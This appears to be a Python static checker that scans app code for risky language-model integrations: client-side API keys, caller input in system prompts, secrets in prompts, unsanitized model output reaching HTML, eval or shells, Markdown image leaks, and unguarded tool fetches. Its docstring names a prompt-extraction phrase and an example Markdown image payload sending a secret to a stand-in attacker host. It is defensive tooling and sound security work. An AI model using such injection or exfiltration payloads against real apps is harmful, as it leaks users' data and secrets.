#!/usr/bin/env python3
"""check_ai.py - static checks on how an app feeds and trusts a language model.

  check_ai.py REPO

A model reads everything it is given as possible instructions, so any text a
stranger controls (a request body, a fetched page, an uploaded file, a tool
result) can steer it. These checks look for the places where that steering
turns into damage. Each one names file:line; test files are excluded.

  ai.none                 no model call found (PASS, with the file count read)
  ai.client-key           a model API called from browser code
                          (dangerouslyAllowBrowser, a NEXT_PUBLIC_/VITE_ model
                          key, or a provider URL fetched from a client file):
                          the key ships to every visitor. FAIL critical.
  ai.prompt.system-input  request input interpolated into the SYSTEM prompt or
                          a system-role message, directly, through a variable
                          built earlier (const, let then +=, a Python name),
                          through content blocks (system: [{ text }]) or a
                          helper that interpolates its argument. User input
                          belongs in a user message; in the system slot it
                          outranks your own instructions. FAIL high.
  ai.prompt.secret        an environment secret (a name with KEY, SECRET, TOKEN,
                          PASSWORD) placed inside prompt text: one "repeat your
                          instructions" and it is printed. FAIL high.
  ai.output.html          model output written as raw HTML (innerHTML,
                          dangerouslySetInnerHTML, v-html, c.html, res.send of
                          the text) with no sanitizer on that sink (a call,
                          a sanitizing helper in the file, or a variable last
                          assigned a sanitized value before it). A prompt
                          injection becomes stored or reflected XSS. FAIL high.
  ai.output.exec          model output passed to eval, new Function, a shell
                          (exec, execSync, spawn with shell), or SQL built by
                          string. FAIL critical.
  ai.output.markdown      model output rendered as Markdown with images or links
                          left on (react-markdown, marked, markdown-it with no
                          image/url restriction on THAT element). A component
                          under a chat, assistant, answer or message path, or
                          one holding useChat() state, counts as rendering the
                          model whatever its prop is named, unless what it
                          renders is the repo's own imported text. An injected
                          ![](https://attacker/?q=<secret>) leaks data the
                          moment it renders. FAIL medium.
  ai.tools.fetch          a tool or function-calling handler fetches a URL the
                          model chose (input.url, args.url) with no allowlist or
                          safe fetch. Indirect injection turns it into SSRF and
                          exfiltration. FAIL high.

A PASS means the pattern was not found in the code read, not that the app is
injection-proof: prove that with ai-redteam against a local dev server.
"""
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import _corepath  # noqa: F401,E402
import ledger  # noqa: E402
import surface  # noqa: E402
import walk  # noqa: E402
from ledger import result  # noqa: E402

MODEL_HOSTS = {h for h, n in surface.PAID_HOSTS.items() if n in {"Anthropic", "OpenAI", "Google Gemini", "Google Vertex", "Perplexity", "OpenRouter"}}
MODEL_SDKS = {"@anthropic-ai/sdk", "openai", "@google/generative-ai", "@google/genai", "ai", "@ai-sdk/anthropic", "@ai-sdk/openai",
              "anthropic", "langchain", "@langchain/core", "@langchain/anthropic", "@langchain/openai", "ollama"}
MODEL_CALL = re.compile(
    r"\.(?:messages|completions|responses)\.(?:create|stream)\s*\(|\.chat\.completions\.create\s*\(|generateContent(?:Stream)?\s*\(|"
    r"\b(?:generateText|streamText|generateObject|streamObject)\s*\(|\benv\.AI\.run\s*\(|\.invoke\s*\(\s*\[|"
    r"https?://(?:" + "|".join(re.escape(h) for h in sorted(MODEL_HOSTS)) + r")")
SYSTEM_SLOT = re.compile(r"""\bsystem(?:Prompt|_prompt|Instruction|_instruction|Message)?\s*[:=]\s*(`[^`]{0,4000}`|'[^'\n]{0,600}'\s*\+[^,\n}]{1,300}|"[^"\n]{0,600}"\s*\+[^,\n}]{1,300}|f"[^"\n]{0,600}"|[\w$.]+\s*\+[^,\n}]{1,300})|"""
                         r"""role\s*:\s*['"]system['"]\s*,\s*content\s*:\s*(`[^`]{0,4000}`|['"][^'"\n]{0,600}['"]\s*\+[^,\n}]{1,300}|[\w$.]+\s*\+[^,\n}]{1,300})|"""
                         r"""content\s*:\s*(`[^`]{0,4000}`|['"][^'"\n]{0,600}['"]\s*\+[^,\n}]{1,300})\s*,\s*role\s*:\s*['"]system['"]""", re.S)
SYSTEM_IDENT = re.compile(r"""\bsystem(?:Prompt|_prompt)?\s*[:=]\s*([A-Za-z_$][\w$]*)\s*[,})\n]""")
# The system slot as a value the regexes above cannot read whole: an array of content blocks (the
# prompt-caching form, system: [{ type: 'text', text: `...` }]) or a call (system: buildSystem(x)).
SYSTEM_ARRAY = re.compile(r"""\bsystem(?:Prompt|_prompt)?\s*[:=]\s*\[""")
SYSTEM_CALL = re.compile(r"""\bsystem(?:Prompt|_prompt)?\s*[:=]\s*(?:await\s+)?([A-Za-z_$][\w$.]*)\s*\(""")
STRING_EXPR = re.compile(r"""`[^`]{0,4000}`|f"[^"\n]{0,600}"|f'[^'\n]{0,600}'|['"][^'"\n]{0,600}['"]\s*\+[^,\n}\]]{1,300}|[\w$.\[\]'"]+\s*\+[^,\n}\]]{1,300}""")
SECRET_NAME = r"[A-Z0-9_]*(?:KEY|SECRET|TOKEN|PASSWORD|PASSWD|CREDENTIAL)[A-Z0-9_]*"
SECRET_REF = re.compile(r"(?:process\.env|env|c\.env|import\.meta\.env|os\.environ(?:\.get\()?\[?['\"]?)\.?(" + SECRET_NAME + r")\b")
PROMPT_SLOT = re.compile(r"""\b(?:system(?:Prompt|_prompt)?|prompt|content|instructions?|messages?)\s*[:=]\s*(`[^`]{0,4000}`|f"[^"\n]{0,800}"|['"][^'"\n]{0,600}['"]\s*\+[^,\n}]{1,300})""", re.S)
OUT_NAME = re.compile(r"\b(?:\w*(?:completion|reply|answer|generated|aiText|aiHtml|llm\w*|modelOutput|assistant\w*|summary|narration|response(?:Text|Html)?|output(?:Text|Html)?)\w*)\b", re.I)
OUT_EXPR = re.compile(r"\.content\[0\]\.text|\.choices\[0\]\.message\.content|\.response\.text\(\)|\.output_text\b|\bresult\.text\b|\(await\s+\w+\.text\(\)\)")
HTML_SINK = re.compile(r"\.innerHTML\s*[+]?=\s*([^;\n]{1,240})|\.outerHTML\s*=\s*([^;\n]{1,240})|insertAdjacentHTML\([^,]+,\s*([^)\n]{1,240})|"
                       r"dangerouslySetInnerHTML=\{\{\s*__html\s*:\s*([^}\n]{1,240})\}\}|\bv-html=\"([^\"]{1,200})\"|\bc\.html\(\s*([^)\n]{1,240})|\bres\.send\(\s*([^)\n]{1,240})|\{@html\s+([^}\n]{1,200})\}")
SANITIZER = re.compile(r"DOMPurify|sanitize(?:Html)?\s*\(|sanitize-html|xss\(|escapeHtml\(|he\.encode\(|bleach\.clean|rehype-sanitize|isomorphic-dompurify", re.I)
EXEC_SINK = re.compile(r"\b(?:eval|new\s+Function|execSync|exec|spawnSync|spawn|execFile)\s*\(\s*([^;\n]{1,240})|\bsubprocess\.\w+\(\s*([^\n]{1,240})|\bos\.system\(\s*([^\n]{1,240})|"
                       r"\.(?:prepare|query|execute|run|\$queryRawUnsafe|\$executeRawUnsafe|raw)\(\s*(`[^`]*\$\{[^`]*`|['\"][^'\"\n]*['\"]\s*\+[^)\n]{1,200}|f\"[^\"\n]*\{[^\"\n]*\")")
MD_RENDER = re.compile(r"<(?:ReactMarkdown|Markdown)\b[^>]{0,400}>|\bmarked(?:\.parse)?\(\s*([^)\n]{1,200})\)|\bmd\.render\(\s*([^)\n]{1,200})\)|markdownit\(|new\s+MarkdownIt\(")
MD_SAFE = re.compile(r"disallowedElements|allowedElements|urlTransform|transformImageUri|transformLinkUri|skipHtml[^\n]{0,40}\bimg\b|rehype-sanitize|DOMPurify|"
                     r"renderer\.image\s*=|renderer\s*:\s*\{[^}]*image|md\.disable\(\s*\[?['\"](?:image|link)", re.I)
TOOL_DEF = re.compile(r"\btools\s*:\s*\[|\btool\s*\(\s*\{|server\.(?:tool|registerTool)\s*\(|\btool_use\b|\btool_calls\b|function_call|inputSchema|input_schema|parameters\s*:\s*z\.object|@tool\b")
TOOL_URL_FETCH = re.compile(r"""\b(?:fetch|axios(?:\.\w+)?|got|ky|undici\.request|requests\.\w+|httpx\.\w+)\(\s*(?:new\s+URL\()?\s*((?:input|args|params|toolInput|tool_input|arguments|block\.input|call\.input|parsed|a)\??\.\w*(?:url|href|link|endpoint|target|uri)\w*|(?:url|href|link|target)\b)""", re.I)
URL_GUARD = re.compile(r"safeFetch|isAllowedUrl|ALLOWED_HOSTS|allowedHosts|ALLOWLIST|allowlist|hostAllow|assertPublic|isPublicUrl|ssrf", re.I)
CHAT_PATH = re.compile(r"(?:^|/)[\w-]*(?:chat|assistant|copilot|bot|answer|reply|conversation|thread|message|bubble)[\w-]*(?:/|\.)", re.I)
# Chat SDK state in a component: what it renders is the model's stream (useChat().messages).
CHAT_STATE = re.compile(r"\buse(?:Chat|Completion|Assistant|UIState|Actions)\s*\(|\breadStreamableValue\s*\(")
# A per-element restriction on one <ReactMarkdown> / <Markdown> tag.
MD_TAG_SAFE = re.compile(r"disallowedElements|allowedElements|urlTransform|transformImageUri|transformLinkUri|rehype-?sanitize|skipHtml[^>]{0,40}\bimg\b"
                         r"|components\s*=\s*\{\{[^}]*\bimg\s*:", re.I)
CLIENT_PATH = re.compile(r"(?:^|/)(?:public|static|client|frontend|web|app)/|\.(?:tsx|jsx|vue|svelte)$|(?:^|/)src/(?:components|pages|routes|hooks|ui)/")
SERVER_HINT = re.compile(r"""['"]use server['"]|(?:^|/)(?:api|server|worker|functions)/|/route\.(?:ts|js)$|(?:^|/)app/.*/actions?\.(?:ts|js)$""")


def _balanced(t, i, open_ch="[", close_ch="]", limit=4000):
    """The text from t[i] (an opening bracket) to its matching close, bounded."""
    depth = 0
    for j in range(i, min(len(t), i + limit)):
        if t[j] == open_ch:
            depth += 1
        elif t[j] == close_ch:
            depth -= 1
            if depth == 0:
                return t[i: j + 1]
    return t[i: i + limit]


def _assignments(t, ident):
    """Every value assigned to ident in the file: const/let/var, a plain reassignment, a +=
    append, and a Python assignment (system_text = f"...")."""
    rx = re.compile(r"(?:(?:const|let|var)\s+)?(?<![\w$.])%s\s*(?::[^=\n]{0,80})?(?:\+=|=(?![=>]))\s*([^;\n]{1,600})" % re.escape(ident))
    return [m.group(1) for m in rx.finditer(t)]


def _function_body(t, name):
    """(params, body) of a function defined in this file, or None: function f(a) {...},
    const f = (a) => ..., def f(a): ..."""
    base = name.split(".")[-1]
    m = re.search(r"\bfunction\s+%s\s*\(([^)]*)\)[^{]*\{" % re.escape(base), t)
    if m:
        return m.group(1), _balanced(t, m.end() - 1, "{", "}", 2000)
    m = re.search(r"(?:const|let|var)\s+%s\s*=\s*(?:async\s*)?\(?([^)=]*)\)?\s*(?::[^=]{0,80})?=>\s*" % re.escape(base), t)
    if m:
        return m.group(1), (_balanced(t, m.end(), "{", "}", 2000) if t[m.end(): m.end() + 1] == "{" else t[m.end(): m.end() + 600])
    m = re.search(r"^[ \t]*def\s+%s\s*\(([^)]*)\)[^:\n]*:([^\n]*\n(?:[ \t]+[^\n]*\n?){0,30})" % re.escape(base), t, re.M)
    if m:
        return m.group(1), m.group(2)
    return None


def _params(text):
    return {re.split(r"[:=]", x)[0].strip(" {}*") for x in text.split(",") if x.strip()} - {""}


def _interpolates(body, params):
    """True when a string built in the body interpolates one of the params."""
    return any(_mentions(_interpolated(m.group(0)), params) for m in STRING_EXPR.finditer(body))


def _mentions(expr, names):
    return any(re.search(r"(?<![\w$.])%s\b" % re.escape(n), expr) for n in names)


def _interpolated(expr):
    """The parts of a prompt value that are code, not literal text."""
    parts = re.findall(r"\$\{([^}]{1,200})\}", expr) + re.findall(r"(?<!\{)\{([^{}]{1,120})\}", expr if expr.startswith(('f"', "f'")) else "")
    if not expr.startswith(("`", 'f"', "f'")):
        parts.append(re.sub(r"(['\"])(?:\\.|(?!\1).)*\1", "", expr))
    return " ".join(parts)


def _caller_value(expr, t, names, depth=2):
    """True when a system-slot value carries caller input: interpolated directly, through a
    variable assembled earlier (const, let then +=, a Python assignment), or through a helper
    called with caller input whose body interpolates its parameter (a helper not defined in this
    file is assumed to). One or two levels of flow, in one file."""
    expr = expr.strip()
    code = _interpolated(expr)
    if not (surface.CALLER_INPUT_RX.search(code) or _mentions(code, names)):
        if depth <= 0:
            return False
        ident = re.fullmatch(r"[A-Za-z_$][\w$]*", expr)
        if ident:
            return any(_caller_value(v, t, names, depth - 1) for v in _assignments(t, expr) if v.strip() != expr)
        return False
    call = re.match(r"(?:await\s+)?([A-Za-z_$][\w$.]*)\s*\(", expr)
    if call and not expr.startswith(("`", "'", '"', "f'", 'f"')):
        fn = _function_body(t, call.group(1))
        if fn:
            return _interpolates(fn[1], _params(fn[0]))
    return True


def _static_names(t):
    """Names that hold the repo's own text, never a model's: import bindings and module-level
    constants assigned a string literal (README imported from content/readme)."""
    out = set()
    for m in re.finditer(r"^\s*import\s+([^'\"]+?)\s+from\s", t, re.M):
        out |= {x.split(" as ")[-1].strip() for x in re.split(r"[{},]", m.group(1)) if x.strip() and x.strip() != "*"}
    for m in re.finditer(r"^(?:export\s+)?const\s+([\w$]+)\s*=\s*(['\"`])", t, re.M):
        out.add(m.group(1))
    return {n for n in out if re.fullmatch(r"[\w$]+", n)}


def _sanitizing_functions(t):
    """Functions defined in this file whose body calls a sanitizer (toSafeHtml wraps DOMPurify)."""
    out = set()
    for m in re.finditer(r"\bfunction\s+([\w$]+)\s*\([^)]*\)[^{]*\{|(?:const|let|var)\s+([\w$]+)\s*=\s*(?:async\s*)?\([^)]*\)\s*=>", t):
        name = m.group(1) or m.group(2)
        body = _balanced(t, m.end() - 1, "{", "}", 2000) if m.group(1) else t[m.end(): m.end() + 400].split("\n")[0]
        if SANITIZER.search(body):
            out.add(name)
    return out


def _clean_at(t, expr, pos, helpers):
    """True when expr is sanitized where it is written: it calls a sanitizer or a sanitizing
    helper, or it names a variable whose LATEST assignment before this point was sanitized
    (const safe = DOMPurify.sanitize(x), or reply = DOMPurify.sanitize(reply))."""
    if SANITIZER.search(expr) or any(re.search(r"(?<![\w$.])%s\s*\(" % re.escape(h), expr) for h in helpers):
        return True
    for ident in set(re.findall(r"(?<![\w$.'\"])([A-Za-z_$][\w$]*)", expr)):
        last = None
        for a in re.finditer(r"(?:(?:const|let|var)\s+)?(?<![\w$.])%s\s*(?::[^=\n]{0,80})?=(?![=>])\s*([^;\n]{1,240})" % re.escape(ident), t[:pos]):
            last = a.group(1)
        if last is not None and (SANITIZER.search(last) or any(re.search(r"(?<![\w$.])%s\s*\(" % re.escape(h), last) for h in helpers)):
            return True
    return False


def _model_files(repo):
    deps = set()
    for pkg in walk.all_package_jsons(repo):
        deps |= set(walk.deps(pkg))
    out = []
    for p in walk.files(repo, tests=False):
        t = walk.read_code(p)
        imports_sdk = re.search(r"""(?:from|require\()\s*['"](%s)['"]""" % "|".join(re.escape(s) for s in MODEL_SDKS), t) or re.search(r"^\s*(?:import|from)\s+(?:anthropic|openai|langchain)\b", t, re.M)
        if MODEL_CALL.search(t) or imports_sdk:
            out.append(p)
    return out, deps


def main():
    repo = os.path.abspath(sys.argv[1])
    res = []
    every = list(walk.files(repo, tests=False))
    mfiles, deps = _model_files(repo)
    if not mfiles and not (MODEL_SDKS & deps):
        return ledger.emit([result("ai.none", "Model calls in the code", "PASS", "%d source files read; no model API host, SDK import or call found" % len(every))])

    client_key, sys_input, secret_prompt, html, execs, md, tool_fetch = [], [], [], [], [], [], []
    for p in every:
        t = walk.read_code(p)
        r = walk.rel(repo, p)
        is_client = bool(CLIENT_PATH.search(r)) and not SERVER_HINT.search(r) and not re.search(r"['\"]use server['\"]", t)
        for m in re.finditer(r"dangerouslyAllowBrowser\s*:\s*true|(?:NEXT_PUBLIC|VITE|PUBLIC|EXPO_PUBLIC|REACT_APP)_\w*(?:ANTHROPIC|OPENAI|GEMINI|CLAUDE|GPT|OPENROUTER|PERPLEXITY)\w*(?:KEY|TOKEN)\b", t):
            client_key.append("%s:%d" % (r, walk.line_of(t, m.start())))
        if is_client:
            for m in re.finditer(r"https?://(?:%s)" % "|".join(re.escape(h) for h in sorted(MODEL_HOSTS)), t):
                client_key.append("%s:%d" % (r, walk.line_of(t, m.start())))

        model_here = p in mfiles
        names = surface.request_names(t)
        if model_here:
            for m in SYSTEM_SLOT.finditer(t):
                expr = next(g for g in m.groups() if g)
                code = _interpolated(expr)
                if surface.CALLER_INPUT_RX.search(code) or _mentions(code, names):
                    sys_input.append("%s:%d" % (r, walk.line_of(t, m.start())))
            # system: systemText (or system=system_text), where systemText was assembled earlier
            for m in SYSTEM_IDENT.finditer(t):
                if _caller_value(m.group(1), t, names):
                    sys_input.append("%s:%d" % (r, walk.line_of(t, m.start())))
            # system: [{ type: 'text', text: `...${tone}` }]: each block's text is a system slot
            for m in SYSTEM_ARRAY.finditer(t):
                block = _balanced(t, m.end() - 1)
                for v in re.finditer(r"""\btext\s*:\s*(`[^`]{0,4000}`|[^,}\n]{1,300})""", block):
                    if _caller_value(v.group(1), t, names):
                        sys_input.append("%s:%d" % (r, walk.line_of(t, m.start())))
            # system: buildSystem(persona): a helper fed caller input
            for m in SYSTEM_CALL.finditer(t):
                call = m.group(0)[m.group(0).index(m.group(1)):] + _balanced(t, m.end() - 1, "(", ")", 600)[1:]
                if _caller_value(call, t, names):
                    sys_input.append("%s:%d" % (r, walk.line_of(t, m.start())))
            for m in PROMPT_SLOT.finditer(t):
                code = _interpolated(m.group(1))
                s = SECRET_REF.search(code)
                if s:
                    secret_prompt.append("%s:%d %s" % (r, walk.line_of(t, m.start()), s.group(1)))

        outs = set(n for n in re.findall(r"(?:const|let|var)\s+([\w$]+)\s*=\s*[^;\n]*(?:\.content\[0\]\.text|choices\[0\]\.message\.content|\.response\.text\(\)|output_text|await\s+(?:generateText|env\.AI\.run))", t))
        def from_model(expr, strict=False):
            # The repo calls a model (checked above), so a UI sink fed `reply`, `answer` or `summary`
            # is read as model output even in a component that only receives it as a prop.
            # strict (exec sinks): only in a file that calls the model or names its output; build
            # scripts exec an `output` variable all the time.
            if OUT_EXPR.search(expr) or _mentions(expr, outs):
                return True
            return bool(OUT_NAME.search(expr)) and (not strict or model_here)
        helpers = _sanitizing_functions(t)
        for m in HTML_SINK.finditer(t):
            expr = next(g for g in m.groups() if g)
            # judged per sink: a sanitizer on one innerHTML in the file says nothing about the next one
            if from_model(expr) and not _clean_at(t, expr, m.start(), helpers):
                html.append("%s:%d" % (r, walk.line_of(t, m.start())))
        for m in EXEC_SINK.finditer(t):
            expr = next(g for g in m.groups() if g)
            if from_model(expr, strict=True):
                execs.append("%s:%d" % (r, walk.line_of(t, m.start())))
        static = _static_names(t)
        chat_ui = bool(CHAT_PATH.search(r)) or bool(CHAT_STATE.search(t))  # app/chat/Answer.tsx, MessageBubble.tsx, useChat()
        for m in MD_RENDER.finditer(t):
            tag = m.group(0)
            if tag.startswith("<"):
                # a JSX render is judged by ITS OWN props: one restricted <ReactMarkdown> in a file
                # says nothing about the next one. A {...props} spread defers to the file's settings.
                if MD_TAG_SAFE.search(tag) or ("{..." in tag and MD_SAFE.search(t)):
                    continue
                child = re.match(r"\s*\{\s*([^{}]{1,200}?)\s*\}\s*</", t[m.end(): m.end() + 260])
                if child and child.group(1) in static:
                    continue  # the repo's own text (an imported README), not a model's
            elif MD_SAFE.search(t):
                continue
            seg = t[m.start(): m.start() + 600]
            if from_model(seg) or ((model_here or chat_ui) and tag.startswith(("<", "markdownit", "new"))):
                md.append("%s:%d" % (r, walk.line_of(t, m.start())))
        if TOOL_DEF.search(t) and not URL_GUARD.search(t):
            for m in TOOL_URL_FETCH.finditer(t):
                tool_fetch.append("%s:%d" % (r, walk.line_of(t, m.start())))

    where = "%d file(s) call a model: %s" % (len(mfiles), ledger.join_hits([walk.rel(repo, p) for p in mfiles], 4, ", "))
    def add(cid, title, hits, sev, fix, ok):
        if hits:
            res.append(result(cid, title, "FAIL", ledger.join_hits(sorted(set(hits)), 6, ", "), severity=sev, fix=fix))
        else:
            res.append(result(cid, title, "PASS", ok + "; " + where))
    add("ai.client-key", "No model API key or call in browser code", client_key, "critical",
        "call the model from a server route only; a key in a browser bundle belongs to everyone who opens the page", "no browser-side model key or provider call")
    add("ai.prompt.system-input", "Caller input stays out of the system prompt", sys_input, "high",
        "keep the system prompt fixed text; pass caller input as a user message, fenced and labeled as data", "no request-derived value in a system slot")
    add("ai.prompt.secret", "No secret inside prompt text", secret_prompt, "high",
        "never put a key, token or password in a prompt; the model can be talked into repeating it", "no KEY/SECRET/TOKEN/PASSWORD env value interpolated into a prompt")
    add("ai.output.html", "Model output is sanitized before it becomes HTML", html, "high",
        "render model text as text, or pass it through DOMPurify (or sanitize-html on the server) before any innerHTML", "no raw-HTML sink fed model output without a sanitizer")
    add("ai.output.exec", "Model output never reaches eval, a shell or string-built SQL", execs, "critical",
        "treat model output as untrusted input: parse it into a fixed set of allowed actions, bind SQL parameters, never eval", "no eval/shell/raw-SQL sink fed model output")
    add("ai.output.markdown", "Rendered model Markdown cannot load attacker images or links", md, "medium",
        "restrict images and link targets (react-markdown disallowedElements=['img'] or a urlTransform allowlist; a marked image renderer that drops external URLs)", "no unrestricted Markdown render of model output")
    add("ai.tools.fetch", "Tools fetch only allowlisted URLs", tool_fetch, "high",
        "route tool fetches through an allowlist or the outbound-fetch-guard safeFetch; never fetch a URL the model picked as-is", "no tool handler fetching a model-chosen URL without a guard")
    return ledger.emit(res)


if __name__ == "__main__":
    sys.exit(main())
